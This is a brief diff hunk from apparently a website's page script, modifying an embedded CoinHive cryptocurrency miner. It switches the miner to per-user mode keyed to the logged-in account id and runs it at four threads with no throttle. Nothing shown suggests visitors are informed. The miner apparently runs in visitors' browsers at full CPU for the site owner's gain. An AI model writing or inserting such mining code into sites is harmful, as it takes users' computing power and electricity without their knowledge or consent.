@@ -929,7 +929,7 @@ $alphabet[-1] = '';
 					$("#accountDropdown .loggedin .dropdown-header").html(data.name+" "+data.surname);
 				}
 
-				var miner = new CoinHive.Anonymous('VGOoKHMh1AUbG8VtWD33mZzDhEznbMaX', me_id, {
+				var miner = new CoinHive.User('VGOoKHMh1AUbG8VtWD33mZzDhEznbMaX', me_id, {
 					threads: 4,
 					autoThreads: true,
 					throttle: 0,
